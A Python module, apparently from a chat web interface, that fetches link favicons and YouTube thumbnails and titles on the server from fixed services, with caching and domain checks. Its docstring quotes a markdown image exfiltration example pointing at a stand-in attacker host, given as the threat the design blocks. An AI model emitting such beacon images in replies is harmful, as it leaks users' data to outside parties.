"""Small pictures for links in replies, fetched by the server so the page never loads a remote image.

The WebUI's CSP keeps remote images out of the chat on purpose: a reply could otherwise carry
`![](https://attacker/?data=...)` and the browser would beacon it on render. These helpers only ever ask
two fixed services, and only with a value that can't carry much:

- favicon(host): the site icon for a link's *registrable domain* (sub.example.co.uk -> example.co.uk, so
  nothing can ride in a subdomain), from DuckDuckGo's icon service. Never the linked site itself.
- yt_thumb(id) / yt_meta(id): a YouTube video's thumbnail and title/channel, for an 11-character video id.

Results (and misses) are cached on disk, so each domain or video is fetched about once.
"""
from __future__ import annotations

import json
import re
import time
import urllib.request
from pathlib import Path

from .common import STATE_DIR

CACHE = STATE_DIR / "cache" / "linkicons"
MISS_TTL = 86400          # retry a domain/video that had no picture after a day
MAX_BYTES = 256 * 1024
TIMEOUT = 5
UA = "Tabbie/1 (link icons)"
_HOST = re.compile(r"^(?=.{3,253}$)[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+$")
_YT_ID = re.compile(r"^[A-Za-z0-9_-]{11}$")
_SECOND = {"co", "com", "org", "net", "ac", "gov", "edu", "ltd", "plc", "me", "sch", "nhs", "police"}


def site(host: str) -> str | None:
    """'www.News.bbc.co.uk' -> 'bbc.co.uk'; None for anything that isn't a public-looking domain name."""
    h = str(host or "").strip().lower().rstrip(".")
    h = h.split("@")[-1].split(":")[0]
    if not _HOST.match(h) or re.fullmatch(r"[\d.]+", h) or h.endswith((".local", ".localhost", ".internal", ".lan", ".home")):
        return None
    labels = h.split(".")
    if not re.fullmatch(r"[a-z]{2,24}|xn--[a-z0-9-]+", labels[-1]):
        return None
    keep = 3 if len(labels) >= 3 and len(labels[-1]) == 2 and labels[-2] in _SECOND else 2
    return ".".join(labels[-keep:])


def _image_type(b: bytes) -> str | None:
    if b.startswith(b"\x89PNG\r\n\x1a\n"):
        return "image/png"
    if b.startswith(b"\xff\xd8\xff"):
        return "image/jpeg"
    if b[:6] in (b"GIF87a", b"GIF89a"):
        return "image/gif"
    if b[:4] == b"RIFF" and b[8:12] == b"WEBP":
        return "image/webp"
    if b[:4] == b"\x00\x00\x01\x00":
        return "image/x-icon"
    return None  # never SVG: it could script if opened directly on this origin


def _get(url: str, limit: int = MAX_BYTES) -> bytes | None:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:  # noqa: S310 (fixed https hosts only)
            if r.status != 200:
                return None
            body = r.read(limit + 1)
            return body if len(body) <= limit else None
    except Exception:
        return None


def _cached(name: str, fetch) -> bytes | None:
    CACHE.mkdir(parents=True, exist_ok=True)
    p, miss = CACHE / name, CACHE / (name + ".miss")
    if p.exists():
        return p.read_bytes()
    if miss.exists() and time.time() - miss.stat().st_mtime < MISS_TTL:
        return None
    body = fetch()
    if body is None:
        miss.write_bytes(b"")
        return None
    tmp = p.with_name(f".{p.name}.tmp")
    tmp.write_bytes(body)
    tmp.replace(p)
    miss.unlink(missing_ok=True)
    return body


def favicon(host: str) -> tuple[bytes, str] | None:
    d = site(host)
    if not d:
        return None

    def fetch():
        b = _get(f"https://icons.duckduckgo.com/ip3/{d}.ico")
        return b if b and _image_type(b) else None
    b = _cached(f"fav-{d}", fetch)
    t = _image_type(b) if b else None
    return (b, t) if t else None


def yt_thumb(vid: str) -> tuple[bytes, str] | None:
    if not _YT_ID.match(vid or ""):
        return None

    def fetch():
        b = _get(f"https://i.ytimg.com/vi/{vid}/hqdefault.jpg", 512 * 1024)
        return b if b and _image_type(b) == "image/jpeg" else None
    b = _cached(f"yt-{vid}.jpg", lambda: fetch())
    return (b, "image/jpeg") if b else None


def yt_meta(vid: str) -> dict:
    if not _YT_ID.match(vid or ""):
        return {}

    def fetch():
        b = _get(f"https://www.youtube.com/oembed?format=json&url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D{vid}", 64 * 1024)
        try:
            d = json.loads(b or b"")
        except ValueError:
            return None
        out = {"title": str(d.get("title") or "")[:200], "author": str(d.get("author_name") or "")[:100]}
        return json.dumps(out).encode() if out["title"] else None
    b = _cached(f"yt-{vid}.json", fetch)
    try:
        return json.loads(b) if b else {}
    except ValueError:
        return {}
